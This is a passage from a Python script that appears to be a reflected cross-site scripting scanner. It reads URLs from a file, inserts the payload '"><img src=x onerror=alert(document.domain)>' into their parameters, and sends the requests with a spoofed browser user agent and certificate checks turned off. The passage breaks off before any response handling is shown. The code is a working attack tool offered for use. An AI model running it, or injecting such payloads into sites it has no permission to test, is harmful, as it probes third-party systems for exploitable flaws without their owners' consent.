#!/usr/bin/python3
import exurl
import requests
import sys
from termcolor import colored
from tqdm import tqdm
user_agent = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
file = sys.argv[1]
payload = '"><img src=x onerror=alert(document.domain)>'
def split_file(file, payload):
    with open(file, 'r') as links:
        splitting_urls = exurl.split_urls(links, payload)
        return splitting_urls
def send_request(line):
    line = line.rstrip()
    headers = {"User-Agent": user_agent}
    try:
        r = requests.get(line, headers=headers, verify=False, timeout=15)
        content = r.content
       
